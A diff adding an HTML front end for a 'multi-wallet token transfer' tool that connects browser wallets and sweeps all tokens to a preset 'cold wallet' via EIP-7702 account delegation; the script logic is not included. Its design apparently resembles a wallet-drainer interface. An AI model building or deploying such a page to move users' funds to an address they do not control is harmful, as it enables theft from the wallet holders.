@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Robust Multi-Wallet Token Transfer</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
+    <script src="config.js"></script>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🚀 Robust Multi-Wallet Token Transfer</h1>
+            <p>Transfer any valuable token from multiple wallets simultaneously</p>
+        </header>
+
+        <div class="wallet-section">
+            <div class="wallet-info" id="walletInfo" style="display: none;">
+                <h3>Connected Wallet</h3>
+                <p><strong>Address:</strong> <span id="walletAddress"></span></p>
+                <p><strong>Network:</strong> <span id="networkName"></span></p>
+                <button id="disconnectBtn" class="btn btn-secondary">Disconnect</button>
+            </div>
+            
+            <div class="wallet-connect" id="walletConnect">
+                <button id="connectBtn" class="btn btn-primary">
+                    🔗 Connect Wallet
+                </button>
+                <p class="help-text">Connect your wallet to get started</p>
+            </div>
+        </div>
+
+        <!-- Wallet Connect Modal -->
+        <div id="walletModal" class="modal" style="display: none;">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h2>Connect Wallet</h2>
+                    <span class="close" id="closeModal">&times;</span>
+                </div>
+                <div class="modal-body">
+                    <p class="modal-description">Choose your preferred wallet to connect</p>
+                    
+                    <div class="wallet-options">
+                        <div class="wallet-option" data-wallet="metamask">
+                            <div class="wallet-icon">
+                                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiByeD0iMTYiIGZpbGw9IiNGRjYwMDAiLz4KPHBhdGggZD0iTTEwLjUgMTBMMTYgMTUuNUwyMS41IDEwTDI2IDE0LjVMMTYgMjQuNUw2IDE0LjVMMTAuNSAxMFoiIGZpbGw9IndoaXRlIi8+Cjwvc3ZnPgo=" alt="MetaMask">
+                            </div>
+                            <div class="wallet-info">
+                                <h3>MetaMask</h3>
+                                <p>Connect using MetaMask browser extension</p>
+                            </div>
+                        </div>
+
+                        <div class="wallet-option" data-wallet="walletconnect">
+                            <div class="wallet-icon">
+                                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiByeD0iMTYiIGZpbGw9IiM0MDA5OTUiLz4KPHBhdGggZD0iTTE2IDhMMjAgMTJMMTYgMTZMMTIgMTJMMTYgOFoiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik0xNiAxNkwyMCAyMEwxNiAyNEwxMiAyMEwxNiAxNloiIGZpbGw9IndoaXRlIi8+Cjwvc3ZnPgo=" alt="WalletConnect">
+                            </div>
+                            <div class="wallet-info">
+                                <h3>WalletConnect</h3>
+                                <p>Connect using WalletConnect protocol</p>
+                            </div>
+                        </div>
+
+                        <div class="wallet-option" data-wallet="coinbase">
+                            <div class="wallet-icon">
+                                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiByeD0iMTYiIGZpbGw9IiMwMDUyRkYiLz4KPHBhdGggZD0iTTE2IDhMMjAgMTJMMTYgMTZMMTIgMTJMMTYgOFoiIGZpbGw9IndoaXRlIi8+Cjwvc3ZnPgo=" alt="Coinbase">
+                            </div>
+                            <div class="wallet-info">
+                                <h3>Coinbase Wallet</h3>
+                                <p>Connect using Coinbase Wallet</p>
+                            </div>
+                        </div>
+
+                        <div class="wallet-option" data-wallet="trust">
+                            <div class="wallet-icon">
+                                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiByeD0iMTYiIGZpbGw9IiMzMzY2RkYiLz4KPHBhdGggZD0iTTE2IDhMMjAgMTJMMTYgMTZMMTIgMTJMMTYgOFoiIGZpbGw9IndoaXRlIi8+Cjwvc3ZnPgo=" alt="Trust Wallet">
+                            </div>
+                            <div class="wallet-info">
+                                <h3>Trust Wallet</h3>
+                                <p>Connect using Trust Wallet</p>
+                            </div>
+                        </div>
+
+                        <div class="wallet-option" data-wallet="rainbow">
+                            <div class="wallet-icon">
+                                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiByeD0iMTYiIGZpbGw9IiNGRjAwNzciLz4KPHBhdGggZD0iTTE2IDhMMjAgMTJMMTYgMTZMMTIgMTJMMTYgOFoiIGZpbGw9IndoaXRlIi8+Cjwvc3ZnPgo=" alt="Rainbow">
+                            </div>
+                            <div class="wallet-info">
+                                <h3>Rainbow</h3>
+                                <p>Connect using Rainbow wallet</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="main-content" id="mainContent" style="display: none;">
+            <div class="info-section">
+                <h3>ℹ️ Transfer Information</h3>
+                <div class="info-box">
+                    <p><strong>Cold Wallet:</strong> <span id="coldWalletDisplay">Loading...</span></p>
+                    <p><strong>Contract:</strong> <span id="contractDisplay">Loading...</span></p>
+                </div>
+            </div>
+
+            <div class="wallets-section">
+                <h3>👛 Multi-Wallet Management</h3>
+                <div class="wallet-input-section">
+                    <input type="text" id="walletInput" placeholder="Enter wallet address (0x...)" class="input-field">
+                    <button id="addWalletBtn" class="btn btn-small">Add Wallet</button>
+                </div>
+                <div class="wallets-list" id="walletsList">
+                    <!-- Wallets will be displayed here -->
+                </div>
+                <button id="scanAllWalletsBtn" class="btn btn-secondary">🔍 Scan All Wallets</button>
+            </div>
+
+            <div class="tokens-section">
+                <h3>💰 Token Overview</h3>
+                <div class="token-summary">
+                    <div class="summary-item">
+                        <span class="summary-label">Total Wallets:</span>
+                        <span class="summary-value" id="totalWallets">0</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Total Tokens:</span>
+                        <span class="summary-value" id="totalTokens">0</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Total Value:</span>
+                        <span class="summary-value">$<span id="totalValue">0.00</span></span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="transfer-section">
+                <h3>🚀 Transfer Tokens</h3>
+                
+                <div class="safety-checks">
+                    <label class="checkbox-label">
+                        <input type="checkbox" id="confirmTransfer">
+                        I confirm I want to transfer ALL tokens from ALL wallets to the cold wallet
+                    </label>
+                    <label class="checkbox-label">
+                        <input type="checkbox" id="confirmEIP7702">
+                        I understand this uses EIP-7702 to set contract code on my EOA
+                    </label>
+                </div>
+
+                <button id="transferAllBtn" class="btn btn-danger" disabled>
+                    🚀 Transfer All Tokens (Multi-Wallet)
+                </button>
+            </div>
+
+            <div class="status-section">
+                <h3>📊 Status</h3>
+                <div class="status-log" id="statusLog">
+                    <div class="status-item">Ready to transfer tokens from multiple wallets</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>⚠️ Always test with small amounts first. This tool uses EIP-7702 technology.</p>
+            <p>Made with ❤️ for robust multi-wallet token transfers</p>
+        </div>
+    </div>
+
+    <script src="robust_seamless_app.js"></script>
+</body>
+</html>
